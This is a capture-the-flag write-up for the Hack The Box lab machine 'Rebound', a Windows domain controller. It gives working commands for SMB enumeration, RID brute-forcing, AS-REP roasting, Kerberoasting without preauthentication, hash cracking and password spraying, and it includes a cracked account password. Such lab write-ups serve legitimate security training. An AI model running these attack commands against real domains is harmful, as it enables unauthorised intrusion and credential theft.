---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Rebound

## Summary

[Rebound](https://app.hackthebox.com/machines/560) is an <mark style="color:red;">insane-rated</mark> box

## Recon

### Information Gathering

Let's start with our [ritualistic nmap scan](../../../tools/tools/port-scanners/nmap.md#nmap-flow) (Figure 1).

```bash
nmap-scan.sh 10.10.11.231
Creating directory...
Performing initial scan...
Extracting ports...
Performing an aggresive scan on open ports...
All done! See results: less scans/aggressive_scan.nmap
```

<figure><img src="../../../.gitbook/assets/rebound_nmap (1).png" alt=""><figcaption><p>Figure 1: Services listening on the Rebound machine.</p></figcaption></figure>

Let's write some things down:

* Based on services like DNS (`53`), Kerberos (`88`) and LDAP (`3268`) we are dealing with a DC.
* The FQDN is `DC01.REBOUND.HTB`.
* SMB is available (`445`).
* WinRM is also available (`5985`). &#x20;

Our plan moving forwards would be to:

1. Add the hostname (`DC01`), domain (`REBOUND.HTB`), and FQDN (`DC01.REBOUND.HTB`) to our local DNS file (`/etc/hosts`).
2. See what information we can get out of the SMB server.
3. See what information we can get out of the LDAP server.

```bash
$ grep rebound /etc/hosts
10.10.11.231    dc01 rebound.htb dc01.rebound.htb
```

### Brute-Forcing RIDs

Quering the SMB server about its shares without passing any or using empty (`' '`) credentials does not work, but `guest` does the trick. There is just one non-default share (`Shared`) but its seems empty  (Figure 2).

{% code overflow="wrap" fullWidth="false" %}
```bash
# enumerating share access
nxc smb dc01 -u 'guest' -p '' --shares
# spidering the specified share
nxc smb dc01 -u 'guest' -p '' --spider Shared --regex .
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/rebound_nxc_shares.png" alt=""><figcaption><p>Figure 2: Enumerating and spidering SMB shares.</p></figcaption></figure>

Using the `--users` flag returns nothing, but we can always try brute-force RIDs (Figure 3).

<figure><img src="../../../.gitbook/assets/rebound_rid_bfa.png" alt=""><figcaption><p>Figure 3: Enumerating users using SMB.</p></figcaption></figure>

Only the last 3 lines of the above output are actual users, which is kind of odd. In addition, we can see that `fflock` has the RID of `3382` which is close to [NXC](../../../tools/tools/active-directory/netexec-cme.md)'s default max RID (`4000`). Let's increase that to see if more usernames pop up (Figure 4).

<pre class="language-bash"><code class="lang-bash"><strong>nxc smb dc01 -u 'guest' -p '' --rid-brute 10000
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/rebound_rid_bfa_10k.png" alt=""><figcaption><p>Figure 4: Enumerating users while with RID up to 10000.</p></figcaption></figure>

We get back 10 more usernames, a total of 13! Let's create a username list.

```bash
# write NXC's output into a file
nxc smb dc01 -u 'guest' -p '' --rid-brute > nxc_users
# extract the usernames
cat nxc_users | awk '{print $6}' | awk -F'\' '{print $2}' | tail -n13
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
ServiceMgmt
winrm_svc
batch_runner
tbrady
delegator$
# extract and write the last 3 lines into a file
cat nxc_users | awk '{print $6}' | awk -F'\' '{print $2}' | tail -n13 > dom_users
```

### Kerberoasting with ASREP

The first thing we always do when we obtain valid domain usernames is to check if any of them are vulnerable to [ASREPRoasting](../../../tl-dr/tl-dr/active-directory/attacks/asreproasting.md).

{% code overflow="wrap" %}
```bash
nxc ldap dc01 -u dom_users -p '' --asreproast asreproast.lst
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.231    445    DC01             $krb5asrep$23$jjones@REBOUND.HTB:5cd9a482dd659d184098afef05d268d4$82239f120ad02681021346c6a7b6d1f76ce6b0c0e1292206fd056a1136c52428b78d1e909944d8d633957bb76dd625afc4fcea0b48310b7b4861550c969c4392dfdfc6cbb36099b3e0fcf7e96f20011e2c36f1faf6b2b67877db5ad0a5922e984d3ea3e24cdfc33425028828007703f913a4232568cf4aff69d457443f418606f03fce800057b01bcac7f2ab8d54a9494206ac9937903b82ac9d85980db467d9d0fe373dcc6bc1ca2a72c85c4f2aa4e0e4f4b8bdfdef491c71e1f954be0288b02f12ed537234711537efa5dd1051a8aca7ec640f93f59e9fbf58179d1f0731e1ff3c1ebf859728b91776
```
{% endcode %}

It seems we get a hit! Sadly, [`hashcat`](../../../tools/tools/passwords/hashcat.md) is not able to crack it.

```bash
hashcat -m18200 asreproast.lst /usr/share/wordlists/rockyou
```

Typically, [Kerberoasting](../../../tl-dr/tl-dr/active-directory/attacks/kerberoasting.md) needs domain credentials, but according to [new research](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/), it is possible to perform this attack using an ASREPRoastable account. In our case, we have `jjones`, so let's try it out (Figure 5).

{% code overflow="wrap" %}
```bash
# cloning impacket
sudo git clone https://github.com/fortra/impacket
Cloning into 'impacket'...
remote: Enumerating objects: 23474, done.
remote: Counting objects: 100% (48/48), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 23474 (delta 19), reused 27 (delta 10), pack-reused 23426
Receiving objects: 100% (23474/23474), 9.97 MiB | 9.29 MiB/s, done.
Resolving deltas: 100% (17811/17811), done.
# kerberoasting
sudo python3 /opt/impacket/examples/GetUserSPNs.py -no-preauth jjones -usersfile dom_users -dc-host 10.10.11.231 rebound.htb/ -outputfile kerb.txt
# checking output
cat kerb.txt
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/rebound_kerberoast.png" alt=""><figcaption><p>Figure 5: Kerberoasting without domain credentials!</p></figcaption></figure>

Luckily for us, `hashcat` is able to crack `ldap_monitor`'s account password this time.

{% code overflow="wrap" %}
```bash
hashcat -m13100 kerb.txt /usr/share/wordlists/rockyou
<SNIP>
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$fde<SNIP>bee:1GR8t@$$4u
<SNIP>
```
{% endcode %}

### Password Spraying

Unfortunately, this account does not have WinRM access. We can continue by performing a password spray attack to check if `ldap_monitor`'s password is being reused (Figure 6).

<figure><img src="../../../.gitbook/assets/rebound_pass_spray.png" alt=""><figcaption><p>Figure 6: Performing a password spray attack.</p></figcaption></figure>

It seems that this password is used in 3 different accounts, but none has WinRM access. Not much we can do with any of them, other than turn to [BloodHound](../../../tools/tools/active-directory/bloodhound.md).

### BloodHound

After some analysis, a path to the foothold is revealed (Figure 7).

{% code overflow="wrap" %}
```bash
nxc ldap dc01.rebound.htb -u ldap_monitor -p ldap_monitor_pass -k --bloodhound -ns 10.10.11.231 -c Group,LocalADmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/rebound_bh.png" alt=""><figcaption><p>Figure 7: Analyzing domain data with BloodHound.</p></figcaption></figure>

Our plan is the following:

<table><thead><tr><th width="399">Rights</th><th>Action</th></tr></thead><tbody><tr><td><code>oorend</code> -> <a href="../../../tl-dr/tl-dr/active-directory/rights/addself.md"><code>AddSelf</code></a> over <code>ServiceMgmt</code></td><td>Add <code>oorend</code> to the <code>ServiceMgmt</code> group.</td></tr><tr><td><code>ServiceMgmt</code> -> <a href="../../../tl-dr/tl-dr/active-directory/rights/genericall.md"><code>GenericAll</code></a> over <code>Service Users</code></td><td>Change the password of <code>WinRM_svc</code>.</td></tr><tr><td><code>WinRM_svc</code> -> member of <code>Remote Management Users</code></td><td>Log into the machine via WinRM.</td></tr></tbody></table>
